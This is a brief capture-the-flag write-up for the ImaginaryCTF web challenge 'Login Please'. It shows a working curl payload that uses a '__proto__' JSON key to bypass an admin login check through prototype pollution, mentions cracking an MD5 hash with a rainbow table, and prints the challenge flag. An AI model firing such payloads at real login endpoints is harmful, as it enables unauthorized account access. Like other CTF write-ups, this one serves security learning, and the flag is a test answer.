# Login Please

* Round: 26 (2022/09)
* Category: Web
* Points: 75
* Solves: 27

## Description

Login as admin to get flag, so easy right?

## Solution

You can send a json with `__proto__` to bypass the `username=admin` check, and crack md5 by using online rainbow table to get flag. It works because `req.body` have null prototype while the `{}` in `Object.assign` doesn't.

```sh
> curl http://puzzler7.imaginaryctf.org:5001/login -H 'Content-Type: application/json' --data '{"password":"admin","__proto__":{"username":"admin"}}'
Welcome admin! The flag is ictf{omg_js_why_are_you_doing_this_to_me}
```
